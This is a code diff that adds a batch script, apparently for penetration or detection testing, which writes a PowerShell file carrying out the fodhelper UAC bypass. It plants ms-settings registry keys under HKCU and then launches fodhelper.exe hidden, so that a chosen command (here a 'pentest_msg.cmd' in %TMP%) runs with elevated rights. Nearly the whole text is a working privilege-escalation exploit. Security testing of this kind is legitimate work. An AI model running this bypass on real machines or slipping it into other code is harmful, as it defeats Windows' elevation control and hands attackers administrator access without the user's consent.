@@ -1,0 +1,26 @@
+set fodPath=%TMP%\anubis_FOD_test.ps1
+echo Set-Variable -Name "paths" -Value $^(Get-Location^) > %fodPath%
+echo Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force >> %fodPath%
+
+echo function FodhelperUACBypass^(^){ >> %fodPath%
+echo Param ^( >> %fodPath%
+echo    [String]$program = "cmd /c start C:\Windows\System32\cmd.exe">> %fodPath%
+echo ^) >> %fodPath%
+echo Set-Variable -Name "paths" -Value $^(Get-Location^) >> %fodPath%
+echo New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force >> %fodPath%
+echo New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force >> %fodPath%
+
+echo Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force >> %fodPath%
+
+echo Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden >> %fodPath%
+rem echo Start-Sleep 3 >> %fodPath%
+rem echo Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force >> %fodPath%
+
+echo } >> %fodPath%
+echo FodhelperUACBypass -program "cmd.exe /c %TMP%\pentest_msg.cmd">>%fodPath%
+echo FodhelperUACBypass -program "cmd.exe /c %TMP%\pentest_msg.cmd">>%fodPath% 
+echo FodhelperUACBypass -program "cmd.exe /c %TMP%\pentest_msg.cmd">>%fodPath%
+echo FodhelperUACBypass -program "cmd.exe /c %TMP%\pentest_msg.cmd">>%fodPath%
+exit /B 0
+
+REM ---------------------------------------------------------------------------------------
